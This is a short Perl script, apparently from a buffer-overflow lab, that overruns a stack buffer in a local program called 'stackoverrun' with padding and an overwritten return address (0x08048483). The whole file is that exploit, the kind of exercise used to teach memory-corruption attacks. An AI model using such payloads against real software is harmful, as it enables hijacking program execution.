#!/usr/bin/perl

$arg = "ABCDEFGHIJKLMNOPQRSTUV"."\x83\x84\x04\x08";
$cmd = "./stackoverrun ".$arg;

system($cmd);
